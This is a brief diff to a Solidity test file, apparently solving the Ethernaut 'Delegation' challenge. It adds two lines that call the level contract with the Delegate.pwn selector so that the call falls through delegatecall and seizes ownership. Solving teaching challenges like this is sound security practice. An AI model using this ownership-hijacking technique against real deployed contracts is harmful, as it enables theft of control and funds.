@@ -27,6 +27,9 @@ contract DelegationTest is LevelTest {
     function exploit() internal override {
         vm.startPrank(player);
 
+        bytes memory data = abi.encodeWithSelector(Delegate.pwn.selector);
+        address(level).call(data);
+
         vm.stopPrank();
     }
 }
